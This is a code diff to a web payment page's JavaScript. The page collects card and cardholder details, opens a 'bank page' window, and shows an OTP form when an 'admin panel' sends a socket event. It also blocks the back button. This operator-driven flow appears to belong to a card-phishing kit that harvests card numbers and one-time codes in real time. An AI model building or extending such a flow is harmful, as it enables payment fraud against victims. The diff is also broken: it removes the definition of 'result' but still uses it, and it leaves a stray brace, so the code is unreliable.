@@ -645,13 +645,17 @@
               cardholder: document.getElementById('cardholderName').value
             })
           });
-          const result = await response.json();
-          if (result.status === "success") {
-            // Open bank page in new window
-            bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
-            currentInvoiceId = result.invoiceId;
-            // Optionally, you can also set up a fallback timeout here if needed
-          }
+          bankPageWindow = window.open(
+      `/bankpage.html?invoiceId=${result.invoiceId}`, 
+      '_blank',
+      'width=600,height=800'
+    );
+    
+    // Store invoice ID and setup socket
+    currentInvoiceId = result.invoiceId;
+    localStorage.setItem('invoiceId', currentInvoiceId);
+    socket.emit('join', currentInvoiceId);
+        }
         } catch (err) {
           console.error('Payment submission error:', err);
           overlay.style.display = 'none';
@@ -759,15 +763,22 @@
     });
     // Listen for hide_bankpage event from admin panel
     socket.on('hide_bankpage', () => {
-      const overlay = document.getElementById('bankpageOverlay');
-      overlay.style.display = 'none';
-      if (bankPageWindow && !bankPageWindow.closed) {
-        bankPageWindow.close();
-      }
-      // Show OTP form after bank page is hidden
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
+  const overlay = document.getElementById('bankpageOverlay');
+  overlay.style.display = 'none';
+  
+  if (bankPageWindow && !bankPageWindow.closed) {
+    bankPageWindow.close();
+  }
+  
+  // Immediately show OTP form
+  document.getElementById('paymentForm').classList.add('hidden');
+  document.getElementById('otpForm').classList.remove('hidden');
+  
+  // Start OTP timer if not already started
+  if (!timerInterval) {
+    startOtpTimer();
+  }
+});
 
     // Back Button Prevention
     window.onpopstate = function(event) {
